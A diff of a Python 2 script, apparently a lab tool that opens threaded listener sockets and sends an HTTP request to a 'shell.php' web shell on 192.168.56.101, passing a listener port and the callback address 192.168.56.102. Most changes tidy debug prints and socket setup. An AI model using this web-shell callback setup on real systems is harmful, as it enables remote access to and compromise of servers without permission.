@@ -36,22 +36,26 @@ class threading_network_listener(threading.Thread):
 
 	def __init__(self, port = None):
 		threading.Thread.__init__(self)
-		print "in the constructor"
 		global connect
 		self.port = port#the intended port for the thread to listen on
 		self.listen_sock = None#the actual socket listening on the port
 		self.message = None
 		self.connection = connect#TODO handle mapping of connections with threads
 		self.port = port
-		print "self.port in the threading_network_listener init: ",self.port
+		#print "self.port in the threading_network_listener init: ",self.port
 		self.socket = self.create_socket(port)
 
 	def create_socket(self,port):
 		""" Creates a socket for the thread to listen on """
-		listen_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)#create a socket
-		listen_socket.bind(("", int(port)))#listens on any interface's ip address
-		listen_socket.listen(5)#actually listen to a port
-		print "network listener socket bound to port ",self.port," ",port
+		listen_socket = None
+		try:
+			listen_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)#create a socket
+			listen_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+			listen_socket.bind(("0.0.0.0", int(port)))#listens on any interface's ip address
+			listen_socket.listen(5)#actually listen to a port
+			#print "network listener socket bound to port ",self.port," ",port
+		except socket.error:#need to handle the fact that both threads are using the same socket
+			pass
 		return listen_socket
 	
 	def run(self):
@@ -65,9 +69,10 @@ class threading_network_listener(threading.Thread):
 		
 
 		#we only need to accept once in this scenario.
-		(sock, address) = self.socket.accept()
 
-		data = sock.recv(50)
+		socks, address = self.socket.accept()
+
+		data = socks.recv(1024)
 
 		time.sleep(.4)#waiting for .4 seconds for the network to respond
 		print 'woke up from my nap'
@@ -239,22 +244,17 @@ def run_candidate_threads(thread_count, timing):
 	"""
 	global connect
 	listener_array = []#holds all of the current threads
+	temp_gen = 0
 	for i in range(thread_count):#create all the new network listeners
 		temp_gen = connect.new_get_port_number()
 		temp_listener = threading_network_listener(temp_gen)
-		print type(temp_listener)
+		#temp_gen type(temp_listener)
 		listener_array.append(threading_network_listener(temp_gen))
-		print "added network listener to array yo"
 
-	print type(listener_array[0])
 	for thread in listener_array:#herp derp want the object not a pointer to it.
-
-		#print len(listener_array)
-		print thread
-		print type(thread)
 		thread.start()
 	
-	http_thread = threading_http_request("192.168.56.101/shell.php",net_listen.port,"192.168.56.102","ok")
+	http_thread = threading_http_request("192.168.56.101/shell.php",temp_gen,"192.168.56.102","ok")
 	http_thread.start()
 
 def check_candidacy():
@@ -263,8 +263,8 @@ def check_candidacy():
 		web server.
 	"""
 	num_threads = int(raw_input("number of threads:"))
-	timing = int(raw_input("timing level(0-5):"))
-	run_candidate_threads(num_threads,timing)
+	#timing = int(raw_input("timing level(0-5):"))
+	run_candidate_threads(num_threads,0)
 
 def show_contents():
 	global directory
@@ -327,7 +327,6 @@ def main():
 
 	#handles keyboard interrupts gracefully
 	signal.signal(signal.SIGINT, keyboardHandler)
-	#a = threading_network_listener()
 
 	while 1:
 		get_input()
